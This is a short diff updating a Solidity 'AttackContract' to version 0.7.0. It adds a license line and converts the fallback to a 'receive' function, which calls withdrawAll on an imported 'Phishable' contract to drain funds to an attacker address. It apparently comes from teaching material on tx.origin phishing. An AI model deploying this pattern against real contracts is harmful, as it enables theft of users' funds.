@@ -1,4 +1,5 @@
-pragma solidity ^0.5.6;
+// SPDX-License-Identifier: ISC
+pragma solidity ^0.7.0;
 
 import "Phishable.sol";
 
@@ -12,7 +13,7 @@ contract AttackContract {
         attacker = _attackerAddress;
     }
 
-    function () external payable {
+    receive () external payable {
         phishableContract.withdrawAll(attacker);
     }
 }
